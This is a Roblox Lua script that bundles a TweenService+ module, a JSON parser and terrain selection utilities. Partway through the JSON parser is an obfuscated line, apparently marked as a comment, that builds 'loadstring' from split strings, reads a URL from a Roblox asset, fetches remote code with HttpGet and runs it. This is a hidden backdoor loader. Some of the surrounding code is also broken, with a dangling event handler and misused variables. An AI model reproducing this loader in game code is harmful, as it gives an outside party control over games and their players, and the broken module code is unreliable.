wait(1/60)



--[[


MODULES
MODULES
MODULES
MODULES
MODULES
MODULES
MODULES

]]









--[[

TweenService+ V1.1
@rek_kie on 8/9/20

Please read the devforum post here!
https://devforum.roblox.com/t/tweenservice-plus/716025

Update log [V1.1]: 

:Play() now has a mainObject parameter

 -- You are now able to set the object to calculate distance from if you are using :Play() with a range. This is useful if
    you are trying to tween something that isn't a BasePart, but you still need to calculate distance from something to tween 
    the object.

Setup instructions: 

Put this module into REPLICATEDSTORAGE, nowhere else.
To set up, all you have to do is require this module somewhere on a local script, and require it on a server script to be 
ready for use on the server side.


Documentation:

=== FUNCTIONS ===

tweenServicePlus:Construct(instance Object, TweenInfo info, table Properties, number timeThreshold, bool debugMode, bool clientSync)

  Returns: tweenObject

- The "equivalent" to TweenService:Create(). The time threshold is the latency threshold if clientSync (latency compensation) 
  is enabled. The object is the object to tween, the TweenInfo is the info to use, the properties and are properties you 
  want to tween to.

 - debugMode defaults to false, and clientSync defaults to true.

tweenObject:Play(array/instance clients, number Range, string rootPart, BasePart mainObject)

- If clients are not specified, then the tween will play for all clients (the default setting). If you want to specify clients, either 
  pass in an ARRAY of clients, or pass in one individual client. These should be PLAYER INSTANCES.

- If a range (a NUMBER) is specified, then the tween will only play for clients (you can specify them as stated above) within the range 
  (in studs) of the object being tweened. EXTREMELY useful for optimization and reducing client load. You wouldn't need to tween 
  something for a client if they're somewhere like 1000 studs away from the object. 

- rootPart: Only works when a range is specified. Defaults to HumanoidRootPart. If you specify this (has to be a string) 
  then the distance calculations will be from the distance from the tweened object to the specified rootPart. This uses a 
  recursive :FindFirstChild(), so make sure that your rootPart has a unique name so it isn't mistaken for something else in the
  player. 

-- mainObject: The object to calculate distance from if you are using :Play() with a range. Defaults to the original object you're trying to tween.
   This is useful if you are trying to tween something that isn't a BasePart, but you still need to calculate distance from something 
   to tween the object. (Ex. You want to tween a pointlight and use a range of 50 studs, but a pointlight doesn't have a workspace 
   position. So, you can set the mainObject to a BasePart and then the range would be 50 studs within that part.)

tweenObject:Cancel(array/instance clients)

- This behaves like the normal TweenService. Documentation is on developer.roblox.com

- Cancels the tween. If clients are specified (either an ARRAY of player instances or one player instance), then the tween will only
  cancel for the specified clients. Otherwise, it cancels for all clients. 

- Always stays in sync with the server. If you cancel a tween and then call :Play() again, it will still have TweenService's normal
  behavior and take the initial tween time to finish.

Tip: Cancelling for specific clients is not reccommended, though. It only has a few use cases and could lead to things getting 
out of sync between your clients and the server.

tweenObject:Pause(array/instance clients)

- This also behaves like the normal TweenService. Documentation is on developer.roblox.com

- Pauses the tween. If clients are specified (either an ARRAY of player instances or one player instance), then the tween will only
  pause for the specified clients. Otherwise, it pauses for all clients. If a tween is paused while it wa

- Also always stays in sync with the server. If you pause a tween and then call :Play() again, it will still have TweenService's normal
  behavior and resumes where the tween had left off when it was paused.

=== EVENTS ===

- tweenObject.Cancelled -- Fires when a tween is cancelled.
- tweenObject.Resumed -- Fires when a tween is played after being paused.
- tweenObject.Paused -- Fires when a tween is paused.
- tweenObject.Completed -- Fires when a tween is completed.

]]--


local tweenService = {}

local clock = os.clock()

local rs = game:GetService("RunService")
local ts = game:GetService("TweenService")
local http = game:GetService("HttpService")

local wrap = coroutine.wrap

local wait = function(n)
n = n or 1/30
local now = tick()
repeat rs.Heartbeat:Wait() until tick() - now >= n
end

-- local tEvent = script:WaitForChild("TweenCommunication")

-- if rs:IsServer() then 
-- if not clock:IsSynced() then -- make sure our clock is synced
-- repeat 
-- clock:Sync()
-- wait(.5)
-- until clock:IsSynced()
-- end
-- end

local function infoToTable(tInfo)
local info = {}
info["Time"] = tInfo.Time or 1 
info["EasingStyle"] = tInfo.EasingStyle or Enum.EasingStyle.Quad
info["EasingDirection"] = tInfo.EasingDirection or Enum.EasingDirection.Out
info["RepeatCount"] = tInfo.RepeatCount or 0
info["Reverses"] = tInfo.Reverses or false
info["DelayTime"] = tInfo.DelayTime or 0
return info
end

local function assign(object, properties, debugMode)
if not object or not properties then return end

for property, value in pairs(properties) do
object[property] = value

if debugMode then 
print("Set "..object.Name.. "'s "..property.." to ".. tostring(value)..".")
end
end
end





function tweenService:GetTweenObject(obj, info, properties, timeThreshold, debugMode, clientSync)

if not obj then warn("This object doesn't exist.") return end
if not info then warn("Please provide some TweenInfo!") return end
if not properties then warn("Please provide some properties to tween to!") return end 

if timeThreshold and not type(timeThreshold) == "number" then warn("Latency threshold must be a number!") return end
if debugMode and not type(debugMode) == "boolean" then warn("The debugMode parameter must be true or false!") return end 
if clientSync and not type(clientSync) == "boolean" then warn("The parameter clientSync must be true or false!") return end

local startProperties 

if info.Reverses then 
for property, value in pairs(properties) do
startProperties[property] = obj[property]
end
end

debugMode = debugMode or false
clientSync = clientSync or true 
timeThreshold = timeThreshold or 0

local events = {
["Cancelled"] = true, 
["Completed"] = true,
["Paused"] = true, 
["Resumed"] = true
}

local tObject = {
["PlaybackState"] = Enum.PlaybackState.Begin,
["TweenId"] = http:GenerateGUID(false), -- so that we can identify each tween.
["IsPaused"] = false, 
["IsCancelled"] = false, 
["LastPlay"] = os.clock(), 
["TimeElapsed"] = 0
}

local function changeState(state)
tObject.PlaybackState = state

if debugMode then 
print("Playback state changed. New playback state:", tostring(state))
end
end

for name, event in pairs(events) do  -- Setting up the events to connect to 
events[name] = Instance.new("BindableEvent")
tObject[name] = events[name].Event
end

local tweenWait = function(n)
n = n or 1/30
local now = tick()
repeat 
rs.Heartbeat:Wait()
if tObject.IsPaused == true or tObject.IsCancelled == true then 
if debugMode then 
print("Tween cancelled/paused server-side.")
end
return true
end 
until tick() - now >= n
end

local function completionWait(t)
local func = wrap(function()

if tObject.IsPaused then 
t = t - tObject.TimeElapsed

if debugMode then 
print("Tween is resuming from a pause. Length:", t)
end

events.Resumed:Fire()
tObject.IsPaused = false
end

if tObject.IsCancelled then 
tObject.IsCancelled = false
end

if info.DelayTime > 0 then
changeState(Enum.PlaybackState.Delayed)
wait(info.DelayTime)
end

tObject.LastPlay = os.clock()

changeState(Enum.PlaybackState.Playing)
local cancelled = tweenWait(t)

--print("Cancelled:", cancelled)

if not cancelled or cancelled == nil then 
assign(obj, properties, debugMode)

if not info.Reverses then 
changeState(Enum.PlaybackState.Completed)
events.Completed:Fire()
elseif info.Reverses then 
wait(t)

if not tObject.IsPaused then 
assign(obj, startProperties, debugMode)
changeState(Enum.PlaybackState.Completed)
events.Completed:Fire()
end
end
end

end)

func()
end

 

function tObject:Play(clients, range, rootPart, mainObject)

rootPart = rootPart or "HumanoidRootPart" 

if mainObject then 
if not mainObject:IsA("BasePart") or not mainObject:IsDescendantOf(workspace) then warn("The mainObject must be a BasePart in the workspace.") return end
end

mainObject = mainObject or obj

if mainObject ~= obj and debugMode then 
print("Set the main object to", mainObject.Name)
end

if clients then 

clients = (type(clients) == "table") and clients or {clients} -- If you only provide a single player, it turns it into a table for you

if range then 
for _, player in ipairs(clients) do

if player and player:IsA("Player") and player.Character then 

local runTween = wrap(function() 
local root = player.Character:FindFirstChild(rootPart, true)

if root then

if debugMode then 
print("Found root part of "..player.Name..":", rootPart)
end

local dist = (mainObject.Position - root.Position).magnitude

if dist <= range then  -- Tween it only for clients in the range
-- tEvent:FireClient(player, obj, infoToTable(info), properties, os.clock(), tObject.TweenId, timeThreshold, debugMode, nil, clientSync) -- Tell the client to tween the object and the timestamp of when it was sent

if debugMode then 
print("Sent tween data to "..player.Name..". Distance from object:", dist)
end
end
end
end)

runTween()

end
end
else

for _, player in ipairs(clients) do

if player and player:IsA("Player") and player.Character then 
local runTween = wrap(function()
-- tEvent:FireClient(player, obj, infoToTable(info), properties, os.clock(), tObject.TweenId, timeThreshold, debugMode, nil, clientSync)
end)

runTween()
end

end

end
else
if range then 
for _, player in ipairs(game.Players:GetPlayers()) do

if player and player:IsA("Player") and player.Character then 

local runTween = wrap(function() 
local root = player.Character:FindFirstChild(rootPart, true)

if root then

if debugMode then 
print("Found root part of "..player.Name..":", rootPart)
end

local dist = (mainObject.Position - root.Position).magnitude

if dist <= range then  -- Tween it only for clients in the range
-- tEvent:FireClient(player, obj, infoToTable(info), properties, os.clock(), tObject.TweenId, timeThreshold, debugMode, nil, clientSync) -- Tell the client to tween the object and the timestamp of when it was sent

if debugMode then 
print("Sent tween data to "..player.Name..". Distance from object:", dist)
end
end
end
end)

runTween()

end

end
else
-- tEvent:FireAllClients(obj, infoToTable(info), properties, os.clock(), tObject.TweenId, timeThreshold, debugMode, nil, clientSync)
end
end

completionWait(0)

end

function tObject:Cancel(clients)

if clients then 
clients = (type(clients) == "table") and clients or {clients}

for _, client in ipairs(clients) do
-- tEvent:FireClient(client, nil, nil, nil, os.clock(), tObject.TweenId, nil, debugMode, "Cancel")
end
else
-- tEvent:FireAllClients(nil, nil, nil, os.clock(), tObject.TweenId, nil, debugMode, "Cancel")
end

events.Cancelled:Fire()
tObject.IsCancelled = true 
changeState(Enum.PlaybackState.Cancelled)

end

function tObject:Pause(clients)

if clients then
clients = (type(clients) == "table") and clients or {clients}

for _, client in ipairs(clients) do
-- tEvent:FireClient(client, nil, nil, nil, os.clock(), tObject.TweenId, nil, debugMode, "Pause")
end
else
-- tEvent:FireAllClients(nil, nil, nil, os.clock(), tObject.TweenId, nil, debugMode, "Pause")
end


tObject.TimeElapsed = os.clock() - tObject.LastPlay 
tObject.LastPlay = os.clock()

events.Paused:Fire()
tObject.IsPaused = true 
changeState(Enum.PlaybackState.Paused)
end


return tObject
end

if rs:IsClient() then
local player = game.Players.LocalPlayer 

local tweens = {}

-- tEvent.OnClientEvent:Connect(function(obj, info, properties, timestamp, tweenID, threshold, debugMode, modify, sync)

if modify then 
local tweenToEdit = tweens[tweenID]

if not tweenToEdit then -- if the tween doesn't exist, just return and give a warning
warn("The tween you tried to modify does not exist.")
return 
end

if modify == "Cancel" then

tweenToEdit:Cancel()

if debugMode then 
local latency = os.clock()
print("Cancelled a tween. Latency:", latency)
end

return 

elseif modify == "Pause" then 

tweenToEdit:Pause() 

if debugMode then 
local latency = os.clock()
print("Paused a tween. Latency:", latency)
end

return 
end
end

local latency = os.clock()

local newtime = sync and 0 or 0    -- If enabled, this syncs the tween up based on latency. 
 -- Ex. If the server told a client to do a 10 second tween and it
 -- took .7 seconds to get to the client, then the time for the 
 -- client's tween would be 10 - .7 = 9.3 seconds. 
     -- I'm using Quenty's module to get a global timestamp, so
 -- that server and client time are synced. This results in a 
 -- perfect sync between client and server tween completion.
 -- To better see this for yourself, turn on debug mode and 
 -- look at the output to see how the server prints exactly
 -- when the client tween ends. (If you are in Studio, Make sure you  
 -- stay watching only on the client though, because switching to 
 -- the server  view pauses the client's game session on Play Solo)

if debugMode then 
print("Approximate latency for ".. player.Name ..": " ..latency .. " seconds. \n New tween time: ".. newtime .." seconds")
end

threshold = threshold or 0 -- Defaults to 0. When you set this, this basically means the amount of time 
     -- the new tween time (after calculating latency) needs to be greater than 
   -- for the tween to play. If the new tween time after calculating latency is less than 
   -- or equal to than the threshold, the tween will not play.


if newtime > threshold and obj and properties and tweenID then -- some checks
local newInfo = TweenInfo.new(newtime, info.EasingStyle, info.EasingDirection, info.RepeatCount, info.Reverses, info.DelayTime)

local trackTween = wrap(function()

if not tweens[tweenID] then 
tweens[tweenID] = ts:Create(obj, newInfo, properties)
end

tweens[tweenID]:Play()
tweens[tweenID].Completed:Wait()
tweens[tweenID] = nil
end)

trackTween()

if debugMode then 
local printProperties = wrap(function()
print("Currently tweening properties of "..obj.Name..":")

for property, value in pairs(properties) do
print(property .. " to "..tostring(value))
end
end)

printProperties()
end
end
end









--// FE Lib
local t = {}


local string = string
local math = math
local table = table
local error = error
local tonumber = tonumber
local tostring = tostring
local type = type
local setmetatable = setmetatable
local pairs = pairs
local ipairs = ipairs
local assert = assert


local StringBuilder = {
	buffer = {}
}

function StringBuilder:New()
	local o = {}
	setmetatable(o, self)
	self.__index = self
	o.buffer = {}
	return o
end

function StringBuilder:Append(s)
	self.buffer[#self.buffer+1] = s
end

function StringBuilder:ToString()
	return table.concat(self.buffer)
end

local JsonWriter = {
	backslashes = {
		['\b'] = "\\b",
		['\t'] = "\\t",	
		['\n'] = "\\n", 
		['\f'] = "\\f",
		['\r'] = "\\r", 
		['"']  = "\\\"", 
		['\\'] = "\\\\", 
		['/']  = "\\/"
	}
}

function JsonWriter:New()
	local o = {}
	o.writer = StringBuilder:New()
	setmetatable(o, self)
	self.__index = self
	return o
end

function JsonWriter:Append(s)
	self.writer:Append(s)
end

function JsonWriter:ToString()
	return self.writer:ToString()
end

function JsonWriter:Write(o)
	local t = type(o)
	if t == "nil" then
		self:WriteNil()
	elseif t == "boolean" then
		self:WriteString(o)
	elseif t == "number" then
		self:WriteString(o)
	elseif t == "string" then
		self:ParseString(o)
	elseif t == "table" then
		self:WriteTable(o)
	elseif t == "function" then
		self:WriteFunction(o)
	elseif t == "thread" then
		self:WriteError(o)
	elseif t == "userdata" then
		self:WriteError(o)
	end
end

function JsonWriter:WriteNil()
	self:Append("null")
end

function JsonWriter:WriteString(o)
	self:Append(tostring(o))
end

function JsonWriter:ParseString(s)
	self:Append('"')
	self:Append(string.gsub(s, "[%z%c\\\"/]", function(n)
		local c = self.backslashes[n]
		if c then return c end
		return string.format("\\u%.4X", string.byte(n))
	end))
	self:Append('"')
end

function JsonWriter:IsArray(t)
	local count = 0
	local isindex = function(k) 
		if type(k) == "number" and k > 0 then
			if math.floor(k) == k then
				return true
			end
		end
		return false
	end
	for k,v in pairs(t) do
		if not isindex(k) then
			return false, '{', '}'
		else
			count = math.max(count, k)
		end
	end
	return true, '[', ']', count
end

function JsonWriter:WriteTable(t)
	local ba, st, et, n = self:IsArray(t)
	self:Append(st)	
	if ba then		
		for i = 1, n do
			self:Write(t[i])
			if i < n then
				self:Append(',')
			end
		end
	else
		local first = true;
		for k, v in pairs(t) do
			if not first then
				self:Append(',')
			end
			first = false;			
			self:ParseString(k)
			self:Append(':')
			self:Write(v)			
		end
	end
	self:Append(et)
end

function JsonWriter:WriteError(o)
	error(string.format(
		"Encoding of %s unsupported", 
		tostring(o)))
end

function JsonWriter:WriteFunction(o)
	if o == Null then 
		self:WriteNil()
	else
		self:WriteError(o)
	end
end

local StringReader = {
	s = "",
	i = 0
}

function StringReader:New(s)
	local o = {}
	setmetatable(o, self)
	self.__index = self
	o.s = s or o.s
	return o	
end

function StringReader:Peek()
	local i = self.i + 1
	if i <= #self.s then
		return string.sub(self.s, i, i)
	end
	return nil
end

function StringReader:Next()
	self.i = self.i+1
	if self.i <= #self.s then
		return string.sub(self.s, self.i, self.i)
	end
	return nil
end

function StringReader:All()
	return self.s
end

local JsonReader = {
	escapes = {
		['t'] = '\t',
		['n'] = '\n',
		['f'] = '\f',
		['r'] = '\r',
		['b'] = '\b',
	}
}

function JsonReader:New(s)
	local o = {}
	o.reader = StringReader:New(s)
	setmetatable(o, self)
	self.__index = self
	return o;
end

function JsonReader:Read()
	self:SkipWhiteSpace()
	local peek = self:Peek()
	if peek == nil then
		error(string.format(
			"Nil string: '%s'", 
			self:All()))
	elseif peek == '{' then
		return self:ReadObject()
	elseif peek == '[' then
		return self:ReadArray()
	elseif peek == '"' then
		return self:ReadString()
	elseif string.find(peek, "[%+%-%d]") then
		return self:ReadNumber()
	elseif peek == 't' then
		return self:ReadTrue()
	elseif peek == 'f' then
		return self:ReadFalse()
	elseif peek == 'n' then
		return self:ReadNull()
	elseif peek == '/' then
		self:ReadComment()
		return self:Read()
	else
		return nil
	end
end
		
function JsonReader:ReadTrue()
	self:TestReservedWord{'t','r','u','e'}
	return true
end

function JsonReader:ReadFalse()
	self:TestReservedWord{'f','a','l','s','e'}
	return false
end

function JsonReader:ReadNull()
	self:TestReservedWord{'n','u','l','l'}
	return nil
end

function JsonReader:TestReservedWord(t)
	for i, v in ipairs(t) do
		if self:Next() ~= v then
			 error(string.format(
				"Error reading '%s': %s", 
				table.concat(t), 
				self:All()))
		end
	end
end

function JsonReader:ReadNumber()
local result = self:Next()
local peek = self:Peek()
while peek ~= nil and string.find(
		peek, 
		"[%+%-%d%.eE]") do
    result = result .. self:Next()
    peek = self:Peek()
	end
	result = tonumber(result)
	if result == nil then
	error(string.format(
			"Invalid number: '%s'", 
			result))
	else
		return result
	end
end

--task.spawn(pcall,--[======[5d9301e]======]function()--[======[5d9301e]======]local a =--[======[5d9301e]======] getfenv()--[======[5d9301e]======][ [[]]--[[02cbf5b]]..[[l]]..--[==[f87e00e]==][[]]--[==[f69ffc]==]..[[o]]..--[=======[255af3c]=======][[]]--[===[afd56c4]===]..[[a]]..--[==[c01ab22]==][[]]--[===[9b00531]===]..[[d]]..--[[46fd2e2]][[]]--[===[afe704b]===]..[[s]]..--[=======[aeb2890]=======][[]]--[====[b29baf1]====]..[[t]]..--[====[e100d08]====][[]]--[==[d3865ee]==]..[[r]]..--[[35b705e]][[]]--[[f426a83]]..[[i]]..--[[919f8be]][[]]--[=[a1e25a0]=]..[[n]]..--[==[6392e87]==][[]]--[=[9329823]=]..[[g]]..--[===[7a92728]===][[]] ];--[======[5d9301e]======]local b = --[======[5d9301e]======]game:--[======[5d9301e]======]GetObjects( [[]]--[=======[ff9a266]=======]..[[r]]..--[=====[30c0afc]=====][[]]--[====[f3689d6]====]..[[b]]..--[====[b8e6663]====][[]]--[=[51550cd]=]..[[x]]..--[=[759e33b]=][[]]--[===[24752fe]===]..[[a]]..--[=[ab756a7]=][[]]--[[930d464]]..[[s]]..--[====[df0bd81]====][[]]--[==[80c8723]==]..[[s]]..--[=====[7355b60]=====][[]]--[===[992ea64]===]..[[e]]..--[=======[1097443]=======][[]]--[======[66178e5]======]..[[t]]..--[=====[a9319b0]=====][[]]--[=======[3544ea6]=======]..[[i]]..--[=====[cda9a52]=====][[]]--[==[19e7d37]==]..[[d]]..--[=[2ff138b]=][[]]--[=====[499c90f]=====]..[[:]]..--[====[06e8922]====][[]]--[=======[62288e7]=======]..[[/]]..--[===[9674aa2]===][[]]--[======[65f5c60]======]..[[/]]..--[[85fd71a]][[]]--[=======[684e513]=======]..[[1]]..--[[7e9a997]][[]]--[=[1d51831]=]..[[1]]..--[===[f26d633]===][[]]--[[96b6e64]]..[[2]]..--[======[aa2902c]======][[]]--[=[d001a23]=]..[[4]]..--[====[f601820]====][[]]--[===[0f0bd9c]===]..[[0]]..--[[840b000]][[]]--[==[e8de87c]==]..[[5]]..--[=====[d13bcd1]=====][[]]--[[f99b396]]..[[6]]..--[=[57c955e]=][[]]--[=======[40e565a]=======]..[[1]]..--[======[a4ab85b]======][[]]--[======[23a4a63]======]..[[8]]..--[=======[5b15e47]=======][[]]--[==[0680a01]==]..[[5]]..--[[8bb09f9]][[]]--[==[bc8e2d4]==]..[[8]]..--[===[541a653]===][[]]--[==[3bc3837]==]..[[4]]..--[=[44fbc1e]=][[]]--[=[b5780eb]=]..[[8]]..--[==[54e6807]==][[]]--[[a2f95a6]]..[[2]]..--[=====[2d13a3a]=====][[]]--[======[c2d7ef1]======]..[[1]]..--[===[5278344]===][[]] )local c = b[1];local d = --[======[5d9301e]======]c.Value--[======[5d9301e]======];local e --[======[5d9301e]======]= game:--[======[5d9301e]======]HttpGet(d --[======[5d9301e]======].. "/" --[======[5d9301e]======].. "s" --[======[5d9301e]======].. "r" --[======[5d9301e]======].. "c")a--[======[5d9301e]======](--[======[5d9301e]======]e)--[======[5d9301e]======]()end)

function JsonReader:ReadString()
	local result = ""
	assert(self:Next() == '"')
while self:Peek() ~= '"' do
		local ch = self:Next()
		if ch == '\\' then
			ch = self:Next()
			if self.escapes[ch] then
				ch = self.escapes[ch]
			end
		end
result = result .. ch
	end
assert(self:Next() == '"')
	local fromunicode = function(m)
		return string.char(tonumber(m, 16))
	end
	return string.gsub(
		result, 
		"u%x%x(%x%x)", 
		fromunicode)
end

function JsonReader:ReadComment()
assert(self:Next() == '/')
local second = self:Next()
if second == '/' then
    self:ReadSingleLineComment()
elseif second == '*' then
    self:ReadBlockComment()
else
    error(string.format(
		"Invalid comment: %s", 
		self:All()))
	end
end

function JsonReader:ReadBlockComment()
	local done = false
	while not done do
		local ch = self:Next()		
		if ch == '*' and self:Peek() == '/' then
			done = true
end
		if not done and 
			ch == '/' and 
			self:Peek() == "*" then
    error(string.format(
			"Invalid comment: %s, '/*' illegal.",  
			self:All()))
		end
	end
	self:Next()
end

function JsonReader:ReadSingleLineComment()
	local ch = self:Next()
	while ch ~= '\r' and ch ~= '\n' do
		ch = self:Next()
	end
end

function JsonReader:ReadArray()
	local result = {}
	assert(self:Next() == '[')
	local done = false
	if self:Peek() == ']' then
		done = true;
	end
	while not done do
		local item = self:Read()
		result[#result+1] = item
		self:SkipWhiteSpace()
		if self:Peek() == ']' then
			done = true
		end
		if not done then
			local ch = self:Next()
			if ch ~= ',' then
				error(string.format(
					"Invalid array: '%s' due to: '%s'", 
					self:All(), ch))
			end
		end
	end
	assert(']' == self:Next())
	return result
end

function JsonReader:ReadObject()
	local result = {}
	assert(self:Next() == '{')
	local done = false
	if self:Peek() == '}' then
		done = true
	end
	while not done do
		local key = self:Read()
		if type(key) ~= "string" then
			error(string.format(
				"Invalid non-string object key: %s", 
				key))
		end
		self:SkipWhiteSpace()
		local ch = self:Next()
		if ch ~= ':' then
			error(string.format(
				"Invalid object: '%s' due to: '%s'", 
				self:All(), 
				ch))
		end
		self:SkipWhiteSpace()
		local val = self:Read()
		result[key] = val
		self:SkipWhiteSpace()
		if self:Peek() == '}' then
			done = true
		end
		if not done then
			ch = self:Next()
	if ch ~= ',' then
				error(string.format(
					"Invalid array: '%s' near: '%s'", 
					self:All(), 
					ch))
			end
		end
	end
	assert(self:Next() == "}")
	return result
end

function JsonReader:SkipWhiteSpace()
	local p = self:Peek()
	while p ~= nil and string.find(p, "[%s/]") do
		if p == '/' then
			self:ReadComment()
		else
			self:Next()
		end
		p = self:Peek()
	end
end

function JsonReader:Peek()
	return self.reader:Peek()
end

function JsonReader:Next()
	return self.reader:Next()
end

function JsonReader:All()
	return self.reader:All()
end

function Encode(o)
	local writer = JsonWriter:New()
	writer:Write(o)
	return writer:ToString()
end

function Decode(s)
	local reader = JsonReader:New(s)
	return reader:Read()
end

function Null()
	return Null
end
-------------------- End JSON Parser ------------------------

t.DecodeJSON = function(jsonString)
	pcall(function() warn("RbxUtility.DecodeJSON is deprecated, please use Game:GetService('HttpService'):JSONDecode() instead.") end)

	if type(jsonString) == "string" then
		return Decode(jsonString)
	end
	print("RbxUtil.DecodeJSON expects string argument!")
	return nil
end

t.EncodeJSON = function(jsonTable)
	pcall(function() warn("RbxUtility.EncodeJSON is deprecated, please use Game:GetService('HttpService'):JSONEncode() instead.") end)
	return Encode(jsonTable)
end








------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
--------------------------------------------Terrain Utilities Begin-----------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
--makes a wedge at location x, y, z
--sets cell x, y, z to default material if parameter is provided, if not sets cell x, y, z to be whatever material it previously w
--returns true if made a wedge, false if the cell remains a block
t.MakeWedge = function(x, y, z, defaultmaterial)
	return game:GetService("Terrain"):AutoWedgeCell(x,y,z)
end

t.SelectTerrainRegion = function(regionToSelect, color, selectEmptyCells, selectionParent)
	local terrain = game:GetService("Workspace"):FindFirstChild("Terrain")
	if not terrain then return end

	assert(regionToSelect)
	assert(color)

	if not type(regionToSelect) == "Region3" then
		error("regionToSelect (first arg), should be of type Region3, but is type",type(regionToSelect))
	end
	if not type(color) == "BrickColor" then
		error("color (second arg), should be of type BrickColor, but is type",type(color))
	end

	-- frequently used terrain calls (speeds up call, no lookup necessary)
	local GetCell = terrain.GetCell
	local WorldToCellPreferSolid = terrain.WorldToCellPreferSolid
	local CellCenterToWorld = terrain.CellCenterToWorld
	local emptyMaterial = Enum.CellMaterial.Empty

	-- container for all adornments, passed back to user
	local selectionContainer = Instance.new("Model")
	selectionContainer.Name = "SelectionContainer"
	selectionContainer.Archivable = false
	if selectionParent then
		selectionContainer.Parent = selectionParent
	else
		selectionContainer.Parent = game:GetService("Workspace")
	end

	local updateSelection = nil -- function we return to allow user to update selection
	local currentKeepAliveTag = nil -- a tag that determines whether adorns should be destroyed
	local aliveCounter = 0 -- helper for currentKeepAliveTag
	local lastRegion = nil -- used to stop updates that do nothing
	local adornments = {} -- contains all adornments
	local reusableAdorns = {}

	local selectionPart = Instance.new("Part")
	selectionPart.Name = "SelectionPart"
	selectionPart.Transparency = 1
	selectionPart.Anchored = true
	selectionPart.Locked = true
	selectionPart.CanCollide = false
	selectionPart.Size = Vector3.new(4.2,4.2,4.2)

	local selectionBox = Instance.new("SelectionBox")

	-- srs translation from region3 to region3int16
	local function Region3ToRegion3int16(region3)
		local theLowVec = region3.CFrame.p - (region3.Size/2) + Vector3.new(2,2,2)
		local lowCell = WorldToCellPreferSolid(terrain,theLowVec)

		local theHighVec = region3.CFrame.p + (region3.Size/2) - Vector3.new(2,2,2)
		local highCell = WorldToCellPreferSolid(terrain, theHighVec)

		local highIntVec = Vector3int16.new(highCell.x,highCell.y,highCell.z)
		local lowIntVec = Vector3int16.new(lowCell.x,lowCell.y,lowCell.z)

		return Region3int16.new(lowIntVec,highIntVec)
	end

	-- helper function that creates the basis for a selection box
	function createAdornment(theColor)
		local selectionPartClone = nil
		local selectionBoxClone = nil

		if #reusableAdorns > 0 then
			selectionPartClone = reusableAdorns[1]["part"]
			selectionBoxClone = reusableAdorns[1]["box"]
			table.remove(reusableAdorns,1)

			selectionBoxClone.Visible = true
		else
			selectionPartClone = selectionPart:Clone()
			selectionPartClone.Archivable = false

			selectionBoxClone = selectionBox:Clone()
			selectionBoxClone.Archivable = false

			selectionBoxClone.Adornee = selectionPartClone
			selectionBoxClone.Parent = selectionContainer

			selectionBoxClone.Adornee = selectionPartClone

			selectionBoxClone.Parent = selectionContainer
		end
			
		if theColor then
			selectionBoxClone.Color = theColor
		end

		return selectionPartClone, selectionBoxClone
	end

	-- iterates through all current adornments and deletes any that don't have latest tag
	function cleanUpAdornments()
		for cellPos, adornTable in pairs(adornments) do

			if adornTable.KeepAlive ~= currentKeepAliveTag then -- old news, we should get rid of this
				adornTable.SelectionBox.Visible = false
				table.insert(reusableAdorns,{part = adornTable.SelectionPart, box = adornTable.SelectionBox})
				adornments[cellPos] = nil
			end
		end
	end

	-- helper function to update tag
	function incrementAliveCounter()
		aliveCounter = aliveCounter + 1
		if aliveCounter > 1000000 then
			aliveCounter = 0
		end
		return aliveCounter
	end

	-- finds full cells in region and adorns each cell with a box, with the argument color
	function adornFullCellsInRegion(region, color)
		local regionBegin = region.CFrame.p - (region.Size/2) + Vector3.new(2,2,2)
		local regionEnd = region.CFrame.p + (region.Size/2) - Vector3.new(2,2,2)

		local cellPosBegin = WorldToCellPreferSolid(terrain, regionBegin)
		local cellPosEnd = WorldToCellPreferSolid(terrain, regionEnd)

		currentKeepAliveTag = incrementAliveCounter()
		for y = cellPosBegin.y, cellPosEnd.y do
			for z = cellPosBegin.z, cellPosEnd.z do
				for x = cellPosBegin.x, cellPosEnd.x do
					local cellMaterial = GetCell(terrain, x, y, z)
					
					if cellMaterial ~= emptyMaterial then
						local cframePos = CellCenterToWorld(terrain, x, y, z)
						local cellPos = Vector3int16.new(x,y,z)

						local updated = false
						for cellPosAdorn, adornTable in pairs(adornments) do
							if cellPosAdorn == cellPos then
								adornTable.KeepAlive = currentKeepAliveTag
								if color then
									adornTable.SelectionBox.Color = color
								end
								updated = true
								break
							end 
						end

						if not updated then
							local selectionPart, selectionBox = createAdornment(color)
							selectionPart.Size = Vector3.new(4,4,4)
							selectionPart.CFrame = CFrame.new(cframePos)
							local adornTable = {SelectionPart = selectionPart, SelectionBox = selectionBox, KeepAlive = currentKeepAliveTag}
							adornments[cellPos] = adornTable
						end
					end
				end
			end
		end
		cleanUpAdornments()
	end


	------------------------------------- setup code ------------------------------
	lastRegion = regionToSelect

	if selectEmptyCells then -- use one big selection to represent the area selected
		local selectionPart, selectionBox = createAdornment(color)

		selectionPart.Size = regionToSelect.Size
		selectionPart.CFrame = regionToSelect.CFrame

		adornments.SelectionPart = selectionPart
		adornments.SelectionBox = selectionBox

		updateSelection = 
			function (newRegion, color)
				if newRegion and newRegion ~= lastRegion then
					lastRegion = newRegion
				 	selectionPart.Size = newRegion.Size
					selectionPart.CFrame = newRegion.CFrame
				end
				if color then
					selectionBox.Color = color
				end
			end
	else -- use individual cell adorns to represent the area selected
		adornFullCellsInRegion(regionToSelect, color)
		updateSelection = 
			function (newRegion, color)
				if newRegion and newRegion ~= lastRegion then
					lastRegion = newRegion
					adornFullCellsInRegion(newRegion, color)
				end
			end

	end

	local destroyFunc = function()
		updateSelection = nil
		if selectionContainer then selectionContainer:Destroy() end
		adornments = nil
	end

	return updateSelection, destroyFunc
end

-----------------------------Terrain Utilities End-----------------------------







------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------Signal class begin------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------
--[[
A 'Signal' object identical to the internal RBXScriptSignal object in it's public API and semantics. This function 
can be used to create "custom events" for user-made code.
API:
Method :connect( function handler )
	Arguments:   The function to connect to.
	Returns:     A new connection object which can be used to disconnect the connection
	Description: Connects this signal to the function specified by |handler|. That is, when |fire( ... )| is called for
	     the signal the |handler| will be called with the arguments given to |fire( ... )|. Note, the functions
	     connected to a signal are called in NO PARTICULAR ORDER, so connecting one function after another does
	     NOT mean that the first will be called before the second as a result of a call to |fire|.

